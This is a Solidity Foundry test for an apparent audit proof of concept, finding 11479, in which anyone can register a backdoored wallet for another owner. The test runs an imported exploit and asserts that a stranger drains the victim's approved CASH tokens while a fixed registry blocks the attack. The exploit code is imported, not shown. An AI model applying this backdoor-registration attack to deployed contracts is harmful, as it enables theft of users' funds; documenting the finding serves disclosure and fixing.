// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {
    Exploit,
    Cash,
    BackdoorModule
} from "./11479-c01-anyone-can-register-backdoored-wallets-for-any-owner-in.sol";

contract Finding11479Test is Test {
    function test_stranger_spends_approved_cash_and_fixed_registry_keeps_the_rest() public {
        Exploit e = new Exploit();
        e.run();

        Cash cash = e.cash();
        BackdoorModule module = e.module();
        assertEq(e.stolen(), e.N(), "stolen");
        assertEq(cash.balanceOf(address(module)), e.N(), "module balance");
        assertEq(e.victimLeft(), e.N(), "victim left");
        assertEq(cash.balanceOf(address(e.victim())), e.N(), "victim balance");
        assertEq(e.listed(), address(e.backdoor()), "listed backdoor");
        assertEq(e.queuedReal(), address(e.clean()), "real wallet queued");
        assertTrue(e.realWalletNotCurrent(), "real wallet not current");
        assertEq(address(e.registry().getSafe(address(e.victim()))), address(e.backdoor()), "getSafe still backdoor");
        assertTrue(e.fixedRejected(), "fixed rejected");
        assertEq(e.controlListed(), address(e.clean()), "control listed");
        assertTrue(e.controlSpendFailed(), "control spend failed");
        assertEq(e.backdoorAllowance(), 0, "backdoor allowance");
        assertEq(e.controlAllowance(), e.N(), "control allowance");
        assertEq(cash.allowance(address(e.victim()), address(e.clean())), e.N(), "clean allowance");

        console2.log("stolen CASH");
        console2.log(e.stolen());
        console2.log("victim CASH left");
        console2.log(e.victimLeft());
        console2.log("backdoor allowance");
        console2.log(e.backdoorAllowance());
        console2.log("control allowance");
        console2.log(e.controlAllowance());
        console2.log("real wallet not current");
        console2.log(e.realWalletNotCurrent() ? 1 : 0);
        console2.log("fixed rejected module safe");
        console2.log(e.fixedRejected() ? 1 : 0);
        console2.log("control spend failed");
        console2.log(e.controlSpendFailed() ? 1 : 0);
    }
}
